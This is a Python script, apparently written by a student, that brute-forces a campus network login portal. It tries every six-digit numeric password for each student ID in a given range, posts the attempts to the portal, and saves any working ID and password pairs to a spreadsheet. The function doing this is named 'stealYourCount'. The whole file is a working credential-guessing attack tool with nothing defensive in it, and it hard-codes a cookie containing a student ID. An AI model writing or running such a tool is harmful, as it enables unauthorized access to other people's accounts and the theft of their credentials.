'''
Created on 2016-8-29

@author: chinayi
'''

import requests
import sys

from writexls import WriteXls
from itertools import product

def httpPost(username, password, MMKey):
    '''
        MMkey = Login means login
        MMkey = Logout or None means logout
    '''
    payload = {'DDDDD':username, 'upass':password, '0MKKey':MMKey}
    headers = {      
                'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
                'Connection':'keep-alive',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'myusername=2014212072; username=2014212072; smartdot=2585'
              }
    r = requests.post(url = 'http://10.3.8.211:80/', data=payload, headers = headers)
    return r.text
    
def stealYourCount(bound_min, bound_max, count = 6):
    '''
        try all possibility for user in range(bound_min, bound_max)
        count is the number of the password
    '''
    possibleCount = []
    row = 0
    wx = WriteXls(""+str(bound_min)+"-"+str(bound_max)+".xls")
    wx.save()
    for i in product('0123456789', repeat = count):
        possibleCount.append("".join(i))
    for i in range(bound_min, bound_max, 1):
        for p in possibleCount:
            html = httpPost(i, p, 'Login')
            if judge(html):
                wx.writeCell(row, 0, str(i))
                wx.writeCell(row, 1, str(p))
                httpPost(i, p, None)
                wx.save()
                break
            else:
                print("not this",p)
        row = row + 1      
    print('over')
                
            
def judge(html):
    if html.find('ldap auth error') != -1:
        return False
    else:
        return True
        
def main():
    try:
        bound_min = int(sys.argv[1])
        bound_max = int(sys.argv[2])
    except TypeError as e:
        print('student ID\'s section required')
    else:
        stealYourCount(bound_min, bound_max, 6)

if __name__ == '__main__':
    main()
    